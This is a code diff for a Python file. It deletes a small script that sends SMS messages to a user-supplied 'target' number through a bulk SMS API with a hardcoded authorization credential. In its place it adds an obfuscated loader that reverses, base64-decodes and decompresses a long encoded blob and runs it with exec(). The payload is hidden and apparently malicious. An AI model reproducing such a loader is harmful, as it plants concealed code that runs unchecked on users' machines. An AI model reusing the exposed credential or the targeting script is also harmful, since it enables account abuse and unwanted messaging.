@@ -1,27 +1,2 @@
-import requests
-import json
-
-def send_sms(target_number, message):
-    api_url = "https://api.bulksms.com/v1/messages"
-    headers = {
-        "Content-Type": "application/json",
-        "Authorization": "Basic NjIwOTY2OTkwMTZGNEU4MzgwRDcxODk0QkU0ODg2MTItMDItQzoyMUZ6KjlDQjJwcmlwU1lZSzBkaDBQMDRCNDhvYQ=="
-    }
-    data = {
-        "message": {
-            "destination": target_number,
-            "source": "Nighga",
-            "content": message
-        }
-    }
-    response = requests.post(api_url, headers=headers, data=json.dumps(data))
-    return response.json()
-
-def main():
-    target_number = input("Enter target phone number: ")
-    message = input("Enter message: ")
-    response = send_sms(target_number, message)
-    print(response)
-
-if __name__ == "__main__":
-    main()
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
+exec((_)(b'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'))
